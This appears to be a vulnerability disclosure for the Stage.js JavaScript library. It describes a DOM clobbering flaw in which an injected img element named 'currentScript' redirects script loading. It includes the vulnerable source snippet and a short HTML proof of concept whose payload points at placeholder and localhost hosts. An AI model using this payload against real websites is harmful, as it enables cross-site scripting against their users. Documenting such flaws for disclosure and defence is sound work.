## Stage.js

### Meta

+ Library: Stage.js
+ Stars: 2.4K
+ Version: v1-alpha
+ Fingerprint: `typeof Stage !== 'undefined' && typeof Stage.create === 'function'`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
+ Impact: XSS
+ Status: Reported
+ CVE: N/A
+ Foundby: TheHulk

### Library

https://github.com/piqnt/stage.js

URL:
+ `https://cdn.jsdelivr.net/npm/stage-js@1.0.0-alpha.4/+esm`
+ `https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.cordova.js `
+ `https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.cordova.min.js `
+ `https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.min.js`

### Vulnerable Code Snippet

```javascript
  function getScriptSrc() {
    // HTML5
    if (document.currentScript) {
      return document.currentScript.src;
    }
```

```javascript
  return function(url) {
    if (/^\.\//.test(url)) {
      var src = getScriptSrc();
      var base = src.substring(0, src.lastIndexOf('/') + 1);
      url = base + url.substring(2);
      // } else if (/^\.\.\//.test(url)) {
      // url = base + url;
    }
    return url;
  };
```

## PoC

```html
<!--Library-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.js" integrity="sha512-rA/8kCbIrzxcXW6akXAiN6FnpM+VW2iv9Zzw4ghu5Mt7xDobt3oraMSDxDeqq4kSUkaTBVdNOy1iyEyFhmceCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
Stage.preload('./a.js')
</script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="http://localhost:9999">
<!--Payload-->
```